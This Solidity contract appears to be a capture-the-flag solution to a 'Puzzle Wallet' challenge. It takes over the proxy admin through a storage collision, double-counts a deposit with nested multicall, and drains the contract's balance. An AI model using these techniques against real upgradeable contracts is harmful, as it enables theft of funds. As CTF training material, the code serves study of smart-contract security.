```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface PuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function setMaxBalance(uint256 _maxBalance) external;
    function execute(address to, uint256 value, bytes calldata data) external;
    function multicall(bytes[] calldata data) payable external;
}

contract PuzzleWalletSolution {
    function hijackAdmin(address _puzzleProxy, address _player) external payable {
        PuzzleProxy proxy = PuzzleProxy(_puzzleProxy);

        // Overriding "owner"
        proxy.proposeNewAdmin(address(this));

        // Add to whitlist
        proxy.addToWhitelist(address(this));

        // Double count deposit.
        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = abi.encodeWithSelector(proxy.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(
            proxy.multicall.selector,
            multicallData
        );
        data[1] = abi.encodeWithSelector(
            proxy.multicall.selector,
            multicallData
        );
        proxy.multicall{value: msg.value}(data);

        // Empty funds
        proxy.execute(address(this), _puzzleProxy.balance, "");

        // Override "admin"
        proxy.setMaxBalance(uint256(uint160(_player)));
    }

    receive() external payable {}
}
```
